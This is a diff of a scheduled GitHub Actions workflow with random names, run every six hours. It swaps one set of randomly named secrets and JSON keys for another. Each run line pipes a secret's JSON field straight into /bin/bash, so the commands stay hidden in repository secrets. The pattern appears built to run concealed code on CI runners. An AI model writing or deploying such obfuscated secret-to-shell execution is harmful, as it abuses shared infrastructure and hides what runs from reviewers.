@@ -1,38 +1,25 @@
 name: wittyclouded
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 1/6 * * *'
+    - cron: '39 3/6 * * *'
 
-jobs:  # 24839
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wittyclouded
         env:
-          vsra16: ${{ secrets.vsra16 }}
+          vuifd46: ${{ secrets.vuifd46 }}
         run: |
-          echo $vsra16 | jq -r .jwchi249 | /bin/bash
-          echo $zk56 | jq -r .oqqb688 | /bin/bash
-          echo $rfa8389 | jq -r .vrkyk09113 | /bin/bash
-          echo $ybef36506 | jq -r .pheht759 | /bin/bash
-          echo $ozdo5 | jq -r .rjfel9918 | /bin/bash
-          echo $l4 | jq -r .kfjh85 | /bin/bash
-          echo $gjng54917 | jq -r .qmco47828 | /bin/bash
-          echo $w405 | jq -r .qmmyc4268 | /bin/bash
-          echo $dysaa6 | jq -r .rfgy11 | /bin/bash
-          echo $v2373 | jq -r .sfoy050 | /bin/bash
-          echo $fcu00269 | jq -r .js565 | /bin/bash
-          echo $ht74 | jq -r .tr73 | /bin/bash
-          echo $jse908 | jq -r .gxp867 | /bin/bash
-          echo $tqnsu9512 | jq -r .tukzv18 | /bin/bash
-          echo $ox42 | jq -r .vw152 | /bin/bash
-          echo $gb4960 | jq -r .y96 | /bin/bash
-          echo $n3715 | jq -r .u953 | /bin/bash
-          echo $oa57 | jq -r .zaaa51 | /bin/bash
-          echo $e49800 | jq -r .g26 | /bin/bash
-          echo $al983 | jq -r .n3 | /bin/bash
-          echo $txox9 | jq -r .o91658 | /bin/bash
+          echo $vuifd46 | jq -r .r59 | /bin/bash
+          echo $u72767 | jq -r .vfmpq12 | /bin/bash
+          echo $yywc0 | jq -r .mugkb0 | /bin/bash
+          echo $m125 | jq -r .l95 | /bin/bash
+          echo $hnex195 | jq -r .fdpmu5 | /bin/bash
+          echo $mzdn80 | jq -r .fts3 | /bin/bash
+          echo $pirvs66298 | jq -r .d8163 | /bin/bash
+          echo $z45 | jq -r .zkmnf019 | /bin/bash
 
